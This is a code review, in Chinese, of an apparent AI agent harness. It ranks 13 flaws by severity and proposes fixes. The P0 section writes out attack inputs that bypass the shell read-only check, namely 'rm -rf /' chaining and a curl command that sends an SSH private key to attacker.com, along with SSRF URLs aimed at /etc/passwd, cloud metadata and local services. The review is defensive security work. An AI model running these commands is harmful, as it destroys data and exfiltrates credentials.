# MiMo Harness Code Review

> 对 `mimo-harness/` 全部代码的逐文件审查，按严重级别分类。

---

## P0 - Critical (安全漏洞 / 必须修复)

### 1. Shell 命令只读检测可绕过

**文件:** `tools/shell.py:21-23`

```python
def _is_readonly(command: str) -> bool:
    cmd_lower = command.strip().lower()
    return any(cmd_lower.startswith(p) for p in READONLY_PREFIXES)
```

**问题:** 只检查命令前缀，可被以下方式绕过：
- `ls; rm -rf /` — 以 `ls` 开头，但执行了破坏性命令
- `echo $(rm -rf /)` — 以 `echo` 开头
- `git status && curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)`

**修复:** 应对命令进行 token 级解析，检测是否包含 `;`, `&&`, `||`, `|`, `$()`, backtick 等链接符。如果有链接符，整条命令应视为非只读。

---

### 2. 文件写入无路径限制

**文件:** `tools/file_ops.py:32-41`

```python
def write_file(params: dict) -> str:
    path = params.get("path", "")
    ...
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
```

**问题:** 可写入系统任意路径（如 `/etc/cron.d/backdoor`），无沙箱限制。

**修复:** 校验 `Path(path).resolve()` 是否在允许的目录范围内（如 `cwd` 及其子目录）。

---

### 3. Web Fetch 无 URL 校验 (SSRF)

**文件:** `tools/web_tools.py:51-66`

```python
def web_fetch(params: dict) -> str:
    url = params.get("url", "")
    resp = requests.get(url, ...)
```

**问题:** 无 URL 校验，可能被利用：
- `file:///etc/passwd` — 读取本地文件
- `http://169.254.169.254/...` — 访问云元数据
- `http://localhost:6379/...` — 访问内部服务

**修复:** 校验 URL scheme 必须为 `http` 或 `https`，拒绝私有 IP 段。

---

### 4. agent.py 底部导入 — `os` 作用域问题

**文件:** `agent.py:196-198`

```python
class MiMoHarness:
    def _build_system_prompt(self) -> str:
        import platform
        ...
        cwd=os.getcwd(),  # line 88, uses os
        ...
    def run(self, task, session=None):
        import os  # line 102
```

**问题:** `os` 在 `run()` 内部导入，但 `_build_system_prompt()` 在 `run()` 中被调用时使用了 `os.getcwd()`。虽然 Python 的 import 机制在模块级已缓存了 `os`，但这依赖于隐式行为，且 `hashlib` 在底部导入（line 197）违反 PEP8。

**修复:** 将 `import os, hashlib` 移到文件顶部。

---

## P1 - Warning (可靠性问题)

### 5. agent.py 访问 registry 私有属性

**文件:** `agent.py:84`

```python
tools_desc = "\n".join(
    f"- **{t.name}**: {t.description}" for t in self.registry._tools.values()
)
```

**问题:** 直接访问 `_tools`（下划线前缀表示私有），破坏封装。

**修复:** 在 `ToolRegistry` 中添加 `list_all()` 方法返回所有 `ToolDef`。

---

### 6. context.py compact_context 假设首条是 system

**文件:** `context.py:50-55`

```python
def compact_context(messages: list, max_messages: int = 30) -> list:
    if len(messages) <= max_messages:
        return messages
    result = [messages[0]]  # keep system prompt
```

**问题:** `agent.py:127` 传入的 `messages` 是 `session.get_messages()`，首条是 user 消息而非 system。system 消息是后来 prepend 的。所以 `compact_context` 保留的 "system prompt" 实际上是第一条 user 消息。

**修复:** `compact_context` 不应假设首条消息类型，或者在 agent.py 中传入完整 messages（含 system）。

---

### 7. 文档工具 csv.DictWriter 不一致

**文件:** `tools/doc_tools.py:51-54`

```python
if data and isinstance(data[0], dict):
    writer.writerow(data[0].keys())
    for row in data:
        writer.writerow(row.values())
```

**问题:** 如果不同行的 dict key 顺序不同，header 和 value 会错位。应使用 `csv.DictWriter`。

---

### 8. logging_utils.py dirname 为空

**文件:** `logging_utils.py:19`

```python
os.makedirs(os.path.dirname(log_file), exist_ok=True)
```

**问题:** 如果 `log_file="agent.log"`，`os.path.dirname` 返回空字符串，`os.makedirs("")` 会抛异常。

**修复:** 添加 `if os.path.dirname(log_file):` 判断。

---

### 9. cli.py 结果判断不可靠

**文件:** `cli.py:127`

```python
if not result.startswith("["):
    pass  # Already printed
```

**问题:** 用 `[` 前缀判断是否为错误/限制信息，但 agent 正常回复也可能以 `[` 开头（如 "Here's [the result]"）。

**修复:** 使用更明确的错误标记，或统一在 `run()` 中处理输出。

---

## P2 - Info (代码质量)

### 10. 未使用的导入

| 文件 | 导入 |
|------|------|
| `agent.py:11` | `build_system_prompt` (未使用) |
| `agent.py:5` | `Optional` (未使用) |
| `context.py:4` | `sys` (未使用) |
| `doc_tools.py:6` | `io` (未使用) |
| `permissions.py:5` | `Optional` (未使用) |

---

### 11. shell.py handler 冗余 lambda

**文件:** `shell.py:67`

```python
handler=lambda p: run_command(p),
```

**修复:** 直接 `handler=run_command`。

---

### 12. agent.py 每次循环重建 system prompt

**文件:** `agent.py:126`

```python
for step in range(self.max_steps):
    system_msg = {"role": "system", "content": self._build_system_prompt()}
```

**问题:** `_build_system_prompt()` 包含 `os.getcwd()`、`platform` 调用和 memory 文件读取，在循环中每步都重新构建，浪费 IO。

**修复:** 在循环外构建一次，或仅在 cwd 变化时重建。

---

### 13. doc_tools.py safe_title 空结果

**文件:** `doc_tools.py:20`

```python
safe_title = "".join(c if c.isalnum() or c in "-_ " else "" for c in title).strip().replace(" ", "_")
```

**问题:** 如果 title 全是特殊字符（如 `"@#$%"`），`safe_title` 为空字符串，文件名变成 `.md`。

**修复:** 添加 fallback `safe_title = safe_title or "untitled"`。

---

## 修复清单

| # | 严重级别 | 文件 | 问题 | 状态 |
|---|---------|------|------|------|
| 1 | P0 | shell.py | 只读检测可绕过 | 待修复 |
| 2 | P0 | file_ops.py | 写入无路径限制 | 待修复 |
| 3 | P0 | web_tools.py | SSRF 风险 | 待修复 |
| 4 | P0 | agent.py | import 位置错误 | 待修复 |
| 5 | P1 | agent.py | 访问私有属性 | 待修复 |
| 6 | P1 | context.py | compact_context 假设错误 | 待修复 |
| 7 | P1 | doc_tools.py | DictWriter 错位 | 待修复 |
| 8 | P1 | logging_utils.py | dirname 为空 | 待修复 |
| 9 | P1 | cli.py | 结果判断不可靠 | 待修复 |
| 10 | P2 | 多文件 | 未使用导入 | 待修复 |
| 11 | P2 | shell.py | 冗余 lambda | 待修复 |
| 12 | P2 | agent.py | 重复构建 prompt | 待修复 |
| 13 | P2 | doc_tools.py | 空 safe_title | 待修复 |
